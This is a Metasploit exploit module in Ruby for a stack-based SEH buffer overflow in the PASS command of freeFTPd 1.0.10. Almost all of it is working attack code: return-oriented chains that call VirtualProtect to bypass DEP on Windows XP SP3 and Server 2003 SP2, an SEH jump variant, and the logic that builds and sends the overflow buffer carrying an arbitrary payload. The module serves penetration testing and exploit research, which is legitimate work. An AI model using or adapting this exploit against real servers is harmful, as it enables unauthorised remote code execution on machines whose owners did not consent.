##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'freeFTPd 1.0.10 PASS Command SEH Overflow',
      'Description'    => %q{
                    This module exploits a SEH stack-based buffer overflow in freeFTPd Server PASS command version 1.0.10.
                credit goes to Wireghoul.

      },
      'Author'         =>
        [
                    'Wireghoul - www.justanotherhacker.com', # original poc
          'Muhamad Fadzil Ramli <fadzil [at] motivsolution.asia>', # dep bypass & metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '96517' ],
          [ 'EDB', '27747' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'seh'
        },
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 512,
          'BadChars' => "\x00\x20\x0a\x0d",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
                    # Windows XP (Build 2600, Service Pack 3) x86 - DEP Bypass
                    [ 'Windows XP Pro SP3 EN - DEP',   { 'Ret' => 0x00493EDE, 'Offset' => 952 } ], # ADD ESP, 46C
                    # Windows .NET Server (Build 3790, Service Pack 2) x86 - DEP Bypass
          [ 'Windows 2003 Server SP2 EN - DEP',   { 'Ret' => 0x00493EDE, 'Offset' => 797 } ], #ADD ESP 46C
                    # Wireghoul offset does not match mine, so using his offset as a credit to him
                    #[ 'Windows XP Pro SP3 EN',   { 'Ret' => 0x00414226 , 'Offset' => 952 } ],
                    [ 'Windows XP Pro SP3 EN',   { 'Ret' => 0x004142f0 , 'Offset' => 797 } ],
        ],
      'DisclosureDate' => 'Aug 21 2013',
      'DefaultTarget' => 0))
  end

  def check
    connect
    disconnect

    if (banner =~ /freeFTPd 1.0/)
      return Exploit::CheckCode::Vulnerable
    end
    Exploit::CheckCode::Safe
  end

  def exploit
    connect

        buf = rand_text_english(1000)

        case target_index()
            when 0
                print_status("Target ID: #{target.name}")
    
                # rop skeleton using mona.py
                rop =
                [
                    0x77c23960,  # POP EBP # RETN [msvcrt.dll]
                    0x77c23960,  # skip 4 bytes [msvcrt.dll]
                    #----------avoid null byte----------------
                    0x77c53436,  # POP EBX # RETN [msvcrt.dll]
                    0x042444DE,  # EBX = 0x042444DE
                    0x77c4d04e,  # POP EDX # RETN [msvcrt.dll]
                    0xFBDBBB62,  # EDX = 0xFBDBBB62
                    0x77c2c7ae,  # ADD EDX,EBX # POP EBX # RETN 0x10
                                 # 0xFBDBBB62 (EDX) + 0x042444DE (EBX) = 0x00000040
                    0xFBDBBD23,  # EBX = 0xFBDBBD23
                    0x77c46101,  # RETN (ROP NOP) [msvcrt.dll]
                    0x77c46101,  # RETN (ROP NOP) [msvcrt.dll]
                    0x77c46101,  # RETN (ROP NOP) [msvcrt.dll]
                    0x77c46101,  # RETN (ROP NOP) [msvcrt.dll]
                    0x77c46101,  # RETN (ROP NOP) [msvcrt.dll]
                    0x77c4e392,  # POP EAX # RETN
                    0x042444DE,  # EAX = 0x042444DE
                    0x77c50c77,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+8] # RETN
                                 # 0xFBDBBD23 (EBX) + 0x042444DE (EAX) = 0x00000201
                    #-----------------------------------------
                    0x77c3b1ad,  # POP ECX # RETN [msvcrt.dll]
                    0x77c62f18,  # &Writable location [msvcrt.dll]
                    0x77c46116,  # POP EDI # RETN [msvcrt.dll]
                    0x77c46101,  # RETN (ROP NOP) [msvcrt.dll]
                    0x77c2eb03,  # POP ESI # RETN [msvcrt.dll]
                    0x77c2aacc,  # JMP [EAX] [msvcrt.dll]
                    0x77c21d16,  # POP EAX # RETN [msvcrt.dll]
                    0x77c11120,  # ptr to &VirtualProtect() [IAT msvcrt.dll]
                    0x77c12df9,  # PUSHAD # RETN [msvcrt.dll]
                    0x77c35524,  # ptr to 'push esp # ret ' [msvcrt.dll]
                ].flatten.pack("V*")

                rop << make_nops(32)
                rop << payload.encoded

                buf[12,rop.length] = rop
                
            when 1
                print_status("Target ID: #{target.name}")

                # rop skeleton using mona.py
                rop =
                [
                    0x77bb2563,  # POP EAX # RETN [msvcrt.dll]
                    0x77ba1114,  # ptr to &VirtualProtect() [IAT msvcrt.dll]
                    0x77bbf244,  # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN [msvcrt.dll]
                    0x41414141,  # Filler (compensate)
                    0x77bb0c86,  # XCHG EAX,ESI # RETN [msvcrt.dll]
                    0x77bac27e,  # POP EBP # RETN [msvcrt.dll]
                    0x77be2265,  # & push esp # ret  [msvcrt.dll]
                    #----------avoid null byte------------------
                    0x77be1ef3,  # POP EDX # RETN [msvcrt.dll]
                    0xFBDBBB63,  # 0x00000040-> edx
                    0x77bcb691,  # POP EBX # RETN [msvcrt.dll]
                    0x042444DD,  # EBX = 0x042444DD
                    0x77bbd50e,  # ADD EDX,EBX # POP EBX # RETN 0x10
                                 # 0x042444DD (EBX) + 0xFBDBBB63 (EDX) = 0x00000040
                    0xFBDBBD23,  # EBX** = 0xFBDBBD23
                    0x77BDFE3E,  # RETN (ROP NOP)
                    0x77BDFE3E,  # RETN (ROP NOP)
                    0x77BDFE3E,  # RETN (ROP NOP)
                    0x77BDFE3E,  # RETN (ROP NOP)
                    0x77BDFE3E,  # RETN (ROP NOP)
                    0x77BC541C,  # XOR EAX,EAX # INC EAX # RETN
                    0x77be2219,  # ADD EAX,42444DD # RETN
                    0x77BDFE37,  # ADD EBX,EAX # OR EAX, 3000000 # RETN
                                 # 0x042444DD (EAX) + 0xFBDBBD23 (EBX**) = 0x00000201
                    #-------------------------------------------
                    0x77bcadff,  # POP ECX # RETN [msvcrt.dll]
                    0x77bf2cfc,  # &Writable location [msvcrt.dll]
                    0x77bd88b8,  # POP EDI # RETN [msvcrt.dll]
                    0x77bd8c05,  # RETN (ROP NOP) [msvcrt.dll]
                    0x77be3adb,  # POP EAX # RETN [msvcrt.dll]
                    0x90909090,  # nop
                    0x77be6591,  # PUSHAD # ADD AL,0EF # RETN [msvcrt.dll]
                ].flatten.pack("V*")

                rop << make_nops(32)
                rop << payload.encoded

                buf[49+40,rop.length] = rop

            when 2
                print_status("Target ID: #{target.name}")

                buf[(target['Offset']-11) - payload.encoded.length, payload.encoded.length] = payload.encoded
                buf[target['Offset']-5,5] = "\xe9\x98\xfe\xff\xff"
                buf[target['Offset'],4]   = [0xfffff9eb].pack("V")
        end

        buf[target['Offset']+4,4] = [target.ret].pack('V')

    print_status("Sending exploit buffer...")
        send_user(datastore['FTPUSER'])
        send_pass(buf)

    handler
    disconnect
  end

end
